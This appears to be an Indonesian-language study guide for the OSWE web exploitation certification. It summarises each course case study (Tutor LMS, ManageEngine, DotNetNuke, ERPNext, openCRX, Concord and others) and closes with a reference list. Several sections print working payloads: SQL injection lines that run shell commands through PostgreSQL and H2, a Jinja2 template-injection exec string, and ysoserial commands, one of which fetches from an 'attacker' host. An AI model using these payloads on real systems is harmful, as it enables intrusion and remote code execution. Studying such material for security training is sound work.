---
name: "OSWE Module Deep-Dive & Full Reference List"
description: "Complete 17-module overview covering all OSWE case studies — Tutor LMS, ManageEngine, DotNetNuke, ERPNext, openCRX, Concord, Guacamole Lite, and more. Includes additional new modules (Advanced SSRF, PP Deep Dive, CORS+CSRF+RCE) and the full 114-reference resource list."
tags: [oswe, modules, tutor-lms, dotnetnuke, manageengine, erpnext, opencrx, concord, guacamole]
---

## 17 Modul Deep-Dive

### Module Overview

WEB-300 memiliki **17 modul** yang berbasis **case study** — setiap modul mempelajari satu aplikasi web nyata (CVE-based atau custom vulnerable app):

| # | Modul | Aplikasi | Vulnerability Class | Language |
|---|-------|----------|-------------------|----------|
| 1 | Introduction | — | Course overview, methodology | — |
| 2 | Tools & Methodologies | — | Burp Suite, dnSpy, JD-GUI, Python | — |
| 3 | Tutor Authentication Bypass and RCE | Tutor LMS | Authentication bypass, RCE | PHP |
| 4 | Tutor LMS Type Juggling | Tutor LMS | PHP Type Juggling | PHP |
| 5 | ManageEngine SQL Injection RCE | ManageEngine | SQL Injection → RCE via PostgreSQL | Java |
| 6 | (lanjutan modul 5) | ManageEngine | SQL Injection → RCE (deep dive) | Java |
| 7 | Bassmaster NodeJS Arbitrary JS Injection | Bassmaster | Prototype pollution? (ARCHIVED) | Node.js |
| 8 | DotNetNuke Cookie Deserialization RCE | DotNetNuke | .NET Deserialization → RCE | C# |
| 9 | ERPNext Authentication Bypass and SSTI | ERPNext | Auth bypass + SSTI | Python |
| 10 | openCRX Auth Bypass and RCE | openCRX | Auth bypass + RCE via database | Java |
| 11 | openIT COCKPIT XSS and OS Command Injection | openIT COCKPIT | XSS → CSRF → RCE | PHP |
| 12 | Concord Authentication Bypass to RCE | Concord | Auth bypass → RCE via serialization | Java |
| 13 | Server-side Request Forgery | Various apps | SSRF exploitation | Multi-Lang |
| 14 | Guacamole Lite Prototype Pollution | Guacamole Lite | Prototype pollution → RCE | Node.js |
| 15 | Conclusion | — | Wrap-up, exam prep | — |
| — | **Advanced SSRF** *(new)* | Custom app | Blind SSRF, metadata service, chaining | Java/Python |
| — | **JavaScript Prototype Pollution** *(new)* | Custom app | Client + Server-side PP | Node.js |
| — | **CORS+CSRF+RCE** *(new)* | Custom app | CORS misconfig, CSRF token bypass, RCE | Java |

### Module 1: Introduction

- Course overview, OSWE exam structure, prerequisites
- Mindset: "Read code like a developer, think like an attacker"
- Why white-box? — You already have the source code, no need for blind guessing
- Lab environment setup: Kali Linux, Burp Suite, Python 3, dnSpy, JD-GUI

### Module 2: Tools & Methodologies

- Burp Suite Community: Proxy, Repeater, Intruder, Decoder
- dnSpy: .NET decompiler and debugger — step-through code at runtime
- JD-GUI / Jadx: Java decompiler untuk membaca class files
- Visual Studio Code: Source code navigation, search, diff
- Python 3: Requests library, Scapy, pwntools
- **No-go tools**: SQLmap, Burp Suite Scanner, source code analyzers (SonarQube, etc.), AI chatbots

### Module 3: Tutor Authentication Bypass and RCE

**Aplikasi**: Tutor LMS (Learning Management System)

**Vulnerability 1 — Authentication Bypass**:
- Weak password reset token generation menggunakan `mt_rand()` — predictable
- Token hanya 6 digit numeric — bisa bruteforce
- Password reset endpoint tidak memiliki rate limiting

**Vulnerability 2 — Remote Code Execution**:
- Setelah bypass auth, upload file PHP via fungsi yang tidak memvalidasi ekstensi dengan benar
- File upload path bisa dimanipulasi via path traversal

**Exploit chain**: Predict password reset token via weak RNG → reset admin password → login → upload PHP shell via insecure upload → RCE

### Module 4: Tutor LMS Type Juggling

**Aplikasi**: Tutor LMS (lanjutan)

**Vulnerability — PHP Type Juggling**:
- Loose comparison (`==`) pada fungsi autentikasi
- Menggunakan `strcmp()` yang mengembalikan `null` (== `0`) jika argumen berupa array
- Magic hash: `0e12345...` PHP treats sebagai float `0`

```php
if (strcmp($_POST['password'], $stored_hash) == 0) { }
// Attack: kirim password[]= (array) → strcmp returns NULL → NULL == 0 → TRUE
```

### Module 5 & 6: ManageEngine SQL Injection RCE

**Aplikasi**: ManageEngine (enterprise management software — Java)

**Vulnerability 1 — SQL Injection**: Input tidak disanitasi dalam parameter yang digunakan di query SQL. PostgreSQL backend — bisa menggunakan `COPY ... FROM PROGRAM` untuk RCE.

**Vulnerability 2 — RCE via PostgreSQL**:
```sql
'; COPY (SELECT '') TO PROGRAM 'powershell -enc BASE64_PAYLOAD'; --
```

**Exploit chain**: SQLi → extract admin credentials → login → SQLi with `COPY FROM PROGRAM` → RCE

### Module 7: Bassmaster NodeJS Arbitrary JavaScript Injection

**Status**: ARCHIVED (tidak lagi dalam exam aktif, tapi pattern-nya masih relevan)

**Vulnerability — Arbitrary JavaScript Injection via `eval()`**:
Input dari request langsung di-pass ke `eval()` function. Modern relevance: Pattern `eval()` dengan user input jarang ditemui, tapi konsepnya mirip dengan SSTI di Node.js template engines dan sandbox escape di `vm.runInNewContext()`.

### Module 8: DotNetNuke Cookie Deserialization RCE

**Aplikasi**: DotNetNuke (DNN) — .NET CMS. CVE-2017-9822.

**Vulnerability — Cookie Deserialization RCE**:
- DNN menggunakan serialized cookie untuk menyimpan session/authentication state
- Cookie didekripsi menggunakan 3DES dengan **hardcoded key**
- Setelah dekripsi, data di-deserialisasi menggunakan `LosFormatter`
- Attacker bisa membuat forged cookie dengan payload deserialization

**Attack flow**:
1. Dapatkan encryption key dari source code (hardcoded)
2. Gunakan ysoserial.net untuk generate gadget chain
3. Enkripsi payload dengan key yang didapat
4. Kirim malicious cookie → server deserialize → RCE

### Module 9: ERPNext Authentication Bypass and SSTI

**Aplikasi**: ERPNext (Python / Frappe Framework)

**Vulnerability 1 — Authentication Bypass**: Logic flaw di reset password flow.

**Vulnerability 2 — Server-Side Template Injection (SSTI)**: Jinja2 template engine dengan user input yang tidak disanitasi. Entry point: field yang menggunakan template rendering (email template, print format, report template).

```python
{{ self.__init__.__globals__.__builtins__.exec('import os; os.system("id")') }}
```

### Module 10: openCRX Auth Bypass and RCE

**Aplikasi**: openCRX (Java-based CRM)

**Vulnerability 1 — Authentication Bypass**: SQL Injection di login page — parameter username tidak disanitasi. Fungsi `authenticate()` menggunakan string concatenation untuk query.

**Vulnerability 2 — RCE via H2 Database**: Aplikasi menggunakan H2 database (in-memory/embedded). H2 memiliki fitur: `CREATE ALIAS` untuk menjalankan Java code.

```sql
'; CREATE ALIAS IF NOT EXISTS shell AS $$ String shell(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return ""; }$$; CALL shell('id'); --
```

### Module 11: openIT COCKPIT XSS and OS Command Injection

**Aplikasi**: openIT COCKPIT (PHP — IT infrastructure management)

**Vulnerability 1 — XSS (blackbox module)**: Module ini menggunakan **blackbox approach** (tidak ada source code). Stored XSS di modul monitoring/alerting.

**Vulnerability 2 — OS Command Injection via WebSocket**: WebSocket endpoint yang menjalankan system command. Input dari WebSocket message tidak disanitasi.

**Exploit chain**: Stored XSS → steal CSRF token → abuse admin privileges → trigger WebSocket command injection via CSRF → RCE

### Module 12: Concord Authentication Bypass to RCE

**Aplikasi**: Concord (Java-based workflow automation)

**Vulnerability 1 — Authentication Bypass**: Weak JWT validation — server menerima JWT dengan algorithm `none`. Atau secret key ditemukan di source code.

```java
Jwts.parser().parse(jwt);  // Without setting signing key!
```

**Vulnerability 2 — RCE via Java Deserialization**: Concord menggunakan Java serialization untuk komunikasi internal. Entry point yang menerima serialized object.

**Exploit chain**: Forge JWT with `alg: none` → admin access → trigger deserialization endpoint → send ysoserial payload → RCE

### Module 13: Server-Side Request Forgery (SSRF)

Aplikasi memproses URL dari user tanpa validasi yang memadai. Bisa digunakan untuk mengakses internal services: Cloud metadata endpoints, internal API endpoints, database HTTP interfaces, file access via `file://` protocol.

### Module 14: Guacamole Lite Prototype Pollution

**Aplikasi**: Guacamole Lite (Node.js)

**Vulnerability — Prototype Pollution**: Input JSON di-merge ke object menggunakan fungsi yang vulnerable. Attacker bisa memodifikasi `__proto__` untuk menginjeksi property ke semua object.

### Module 15: Conclusion

Review of all vulnerability classes, exam preparation checklist, report writing guidelines, recommended practice labs.

### Additional New Modules (2024-2025)

#### Advanced SSRF
- Blind SSRF detection via out-of-band (Burp Collaborator, interactsh)
- SSRF via DNS rebinding (TOCTOU bypass)
- SSRF to RCE via cloud metadata service
- SSRF with protocol smuggling (gopher, dict, file, ftp)

#### JavaScript Prototype Pollution — Deep Dive
- Server-side prototype pollution in Node.js
- Client-side PP in browser → XSS
- Automated PP scanner via JSON.parse + recursive merge

#### CORS + CSRF + RCE Chain
- CORS misconfiguration (`Access-Control-Allow-Origin: *` with credentials)
- CSRF token stored in cookie (not tied to session)
- Exploit chain: CORS-enabled API → steal CSRF token → CSRF to change admin password → login → RCE

### Tools Deep Dive

**Burp Suite Community**:
```
Proxy: 127.0.0.1:8080
Intercept: ON (for initial recon), OFF (for exploit testing)
Repeater: Test each vulnerability manually before writing exploit
```

**dnSpy (.NET Decompiler / Debugger)**:
- Decompile any .NET assembly to C#
- Debug — attach to running process, set breakpoints
- Edit method — modify IL code at runtime
- Typical: Load DLL → search for `Deserialize`, `BinaryFormatter` → set breakpoint → trigger request → inspect

**JD-GUI / Jadx (Java Decompiler)**:
- Decompile `.class` / `.jar` to readable Java source
- Search for `Runtime.exec`, `Statement.executeQuery`, `ObjectInputStream`
- Trace data flow from entry point to sink

**ysoserial / ysoserial.net**:
```bash
# Java
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/shell.jsp'

# .NET
mono ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "powershell -enc BASE64"
```

### Full Reference List

**Official OffSec**:
- WEB-300 Course: https://www.offsec.com/courses/web-300/
- OSWE Exam Guide: https://help.offsec.com/hc/en-us/articles/360049792232-OSWE-Exam-Guide

**.NET Deserialization**:
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- DotNetNuke CVE-2017-9822: https://www.exploit-db.com/exploits/43973

**PHP Type Juggling**:
- PHP Type Juggling: https://www.php.net/manual/en/language.types.type-juggling.php
- Magic Hashes List: https://github.com/spaze/hashes

**SQL Injection & Database**:
- PostgreSQL COPY FROM PROGRAM: https://www.postgresql.org/docs/current/sql-copy.html
- H2 Database RCE: https://mthbernardes.github.io/pentesting/2018/02/05/h2db-rce.html

**SSTI**:
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- HackTricks SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/

**SSRF**:
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf
- HackTricks SSRF: https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/

**Prototype Pollution**:
- PortSwigger PP: https://portswigger.net/web-security/prototype-pollution
- HackTricks PP: https://book.hacktricks.wiki/en/pentesting-web/prototype-pollution/

**XXE**:
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- OWASP XXE Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

**Tools**:
- Burp Suite: https://portswigger.net/burp/communitydownload
- dnSpy: https://github.com/dnSpy/dnSpy
- ysoserial: https://github.com/frohoff/ysoserial

**Practice**:
- OSWE-Prep: https://github.com/Xcatolin/OSWE-Prep
- Web Security Academy: https://portswigger.net/web-security
